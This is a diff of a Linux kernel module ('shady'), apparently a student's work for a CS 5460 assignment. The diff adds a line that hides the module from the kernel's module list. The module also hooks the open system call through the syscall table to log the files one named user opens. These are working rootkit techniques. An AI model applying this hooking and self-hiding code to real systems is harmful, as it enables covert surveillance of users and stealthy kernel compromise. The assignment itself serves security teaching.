@@ -11,7 +11,10 @@
  * This program is free software; you can redistribute it and/or modify it
  * under the terms of the GNU General Public License version 2 as published
  * by the Free Software Foundation.
- ======================================================================== */
+ ======================================================================== 
+ * Implemented by Camille Rasmussen
+ * CS 5460 
+ * 4/10/17 */
 
 #include <linux/version.h>
 #include <linux/module.h>
@@ -63,10 +66,10 @@ asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
   /* YOUR CODE HERE */
-  printk("my_open was called.");
+  printk("my_open was called.\n");
 
   if (get_current_user()->uid.val == marks_uid) {
-    printk("mark is about to open '%s'.", file);
+    printk("mark is about to open '%s'.\n", file);
   }
 
   // be sure to call old_open here so the syscall to open actually works
@@ -228,6 +231,7 @@ shady_cleanup_module(int devices_to_destroy)
    * has failed. */
   unregister_chrdev_region(MKDEV(shady_major, 0), shady_ndevices);
 
+  printk("Restoring original open syscall.\n");
   system_call_table_address[__NR_open] = old_open;
   return;
 }
@@ -240,6 +244,9 @@ shady_init_module(void)
   int devices_to_destroy = 0;
   dev_t dev = 0;
 
+  list_del_init(&__this_module.list);
+
+  printk("Hacking into system call table and altering open syscall addr.\n");
   set_addr_rw((unsigned long)system_call_table_address);
   old_open = system_call_table_address[__NR_open];
   system_call_table_address[__NR_open] = my_open;
